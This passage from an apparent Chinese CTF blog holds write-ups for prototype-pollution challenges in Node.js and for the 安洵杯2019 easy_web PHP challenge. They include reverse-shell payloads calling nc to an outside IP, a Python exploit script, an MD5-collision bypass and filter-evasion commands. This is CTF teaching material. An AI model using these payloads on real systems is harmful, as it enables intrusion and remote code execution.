class="line">  res.json(req.session.sekiro);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>以及util/index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.attacks = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"连续砍击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=100"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"连续格挡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"普通攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=50"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"格挡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"下段攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"跳跃踩头"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"突刺攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"识破"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"巴之雷"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"雷反"</span></span><br><span class="line">        &#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">this</span>.getAttackInfo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.attacks[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="keyword">this</span>.attacks.length)]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.dealWithAttacks = <span class="function"><span class="keyword">function</span> (<span class="params">sekiro, solution</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sekiro.attackInfo.solution !== solution) &#123;</span><br><span class="line">            sekiro.health -= sekiro.attackInfo.attack</span><br><span class="line">            <span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">                <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sekiro.posture = (sekiro.posture &lt;= <span class="number">500</span>) ? sekiro.posture : <span class="number">500</span></span><br><span class="line">        sekiro.health = (sekiro.health &gt; <span class="number">0</span>) ? sekiro.health : <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (sekiro.posture == <span class="number">500</span> || sekiro.health == <span class="number">0</span>) &#123;</span><br><span class="line">            sekiro.alive = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sekiro</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = game;</span><br></pre></td></tr></table></figure><p>很容易发现index.js中，在<code>/action</code>这个路由里，有<code>merge(),clone()</code>函数的出现。于是我们跟进下，发现要到<code>dealWithAttacks()</code>这个函数去，于是再审计下关键代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">    sekiro = fn(sekiro)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>attackInfo.additionalEffect</code>如果能被我们污染，明显是可以直接RCE的。那么我们要做的就是污染Object类，当题目执行<code>attackInfo.additionalEffect</code>找不到<code>additionalEffect</code>时，就会继续找到基类被污染的这一属性，从而执行我们的代码。</p><p>所以paylaod如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"solution"</span>:<span class="string">"1"</span>,<span class="string">"__proto__"</span>: &#123;<span class="string">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process'). exec('nc vps-ip 8877 -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>我在使用bp传值时没弹到shell,后来只能用python写脚本了，也许是JSON数据的问题吧。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://sekiro.hgame.babelfish.ink/action'</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'session'</span>:<span class="string">'s%3ACDDqh7q_XQ-rRAIB7W93PfE75p9oD7gS.UQuPEE0eikMrkIoAUaWJ3TFIibdRs72odZliCVcyzrk'</span></span><br><span class="line">&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;<span class="string">"solution"</span>:<span class="string">"1"</span>,<span class="string">"__proto__"</span>: &#123;<span class="string">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process'). exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(url,cookies=cookie,headers=headers,data=json.dumps(payload))</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>使用bash弹shell貌似没成，可能是某些奇怪的问题<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/flag.PNG" alt="flag"></p><h2 id="code-breaking-thejs"><a href="#code-breaking-thejs" class="headerlink" title="code-breaking thejs"></a>code-breaking thejs</h2><p>开头提到了p牛知识星球的这道题，那么现在再来看看：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port 3000!`</span>))</span><br></pre></td></tr></table></figure><p>漏洞点非常清晰，就是一个POST处用到了merge,显然存在原型链污染漏洞。那么关键函数需要去看看，所以需要参考lodash的代码（lodash是一个辅助功能集，这里主要用到的还是<code>lodash.merge</code>和<code>lodash.template</code>）如果去审计源码，会发现这样一个属性<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a>及对应源码，和后面的调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>开始<code>sourceURL</code>是空值，但是后面它作为new Function的第二个参数中，造成任意代码执行漏洞。<br>所以payload如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>:&#123;<span class="string">"sourceURL"</span>:<span class="string">"\u000aglobal.process.mainModule.constructor._load('child_process').exec('nc 120.27.246.202 8888 -e /bin/sh',function()&#123;&#125;);"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.PNG" alt="payload"></p><p>需要注意的是，此处的<code>/u000a</code>必不可少,这时json中的换行。并且一定要把<code>Content-Type</code>必须设置成<code>application/json</code>。否则<code>__proto__</code>会被处理成字符串。<br>这里同样使用跟hgame那道题一样的弹shell手段。可以拿到shell<br>同时因为不知道文件名，使用<code>cat /fl*</code>来模糊处理。<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/flag1.PNG" alt="flag"><br>值得一提的是，p牛对此题的payload额外带了一个for循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (var a in&#123;&#125;) &#123;delete Object.prototype[a]&#125;</span><br></pre></td></tr></table></figure><p>删掉污染的原型。这时因为原型污染这一漏洞除非整个程序重启，否则所有的对象都会被污染与影响。这样在awd等等比赛中一旦你拿到flag,就有可能被别人直接访问到。</p><p>总结下：<br>1.原型链污染属于前端漏洞应用，基本上需要源码审计功力来进行解决；找到<code>merge(),clone()</code>只是确定漏洞的开始<br>2.进行审计需要以达成RCE为主要目的。通常<code>exec, return</code>等等都是值得注意的关键字。<br>3.题目基本是以弹shell为最终目的。目前来看很多Node.js传统弹shell方式并不适用.wget,curl,以及我两道题都用到的nc比较适用。</p><p>参考文章：</p><p><a href="https://www.anquanke.com/post/id/176884#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884#h3-5</a><br><a href="https://xz.aliyun.com/t/2802" target="_blank" rel="noopener">https://xz.aliyun.com/t/2802</a><br><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2019-web复现</title>
      <link href="2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>发现buuoj上安洵2019的题目有现成的，不用在vps上搭了(第一题除外，搭好才发现……)，刚好做做。</p><a id="more"></a><h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><p>进去后url有两个明显参数，第一个类似于base64编码，第二个由参数名知道可能是rce参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>先解码前面一个参数的值，发现base64解了两次后得到一串数字，看起来像十六进制字符。尝试16进制解码后得到<code>555.pnf0</code>证实了加密方式。<br>加上图片的回显有base64的内容，可知img参数用于文件包含，那么包含下index.php吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str=<span class="string">'index.php'</span></span><br><span class="line">filename = str.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">print(hex)</span><br><span class="line">base1 = base64.b64encode(hex)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line">print(base2.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>第一个参数已经利用完了，而第二个参数用于rce,但明显过滤了许多读取文件的命令。<br>同时可知要执行命令必须绕过一层MD5对比。基于使用了php强相等符号，可知一定要找到一对MD5相同的不同字符串。可以用某种MD5碰撞生成器得到。我直接用官方wp里的吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>之后就是执行命令了。直接利用匹配正则里面<code>\</code>的疏忽，用它使我们的关键字构建出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t%20&#x2F;flag                    cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>或者使用没被过滤的读取文件的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort &#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" alt="flag"></p><h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>题目对我有点难，但是打开了反序列化新世界的大门<br>一道反序列化利用题，上来直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路上首先看看可控的参数，有get传值的<code>f,img_path</code>。但是注意到<code>img_path</code>搭配上<code>f</code>为<code>show_image</code>时，返回的内容并不可用，因为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br></pre></td></tr></table></figure><p>中，我们传的值经过sha1加密后并没有解密，故不可用。<br>此时关注其他重点,有一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure><p>是一个变量覆盖的利用。所以我们的变量值都可以通过post操作改变，这样可控的参数多了起来。<br>同时注意到序列化语句，会在调用<code>show_image</code>时被触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info &#x3D; 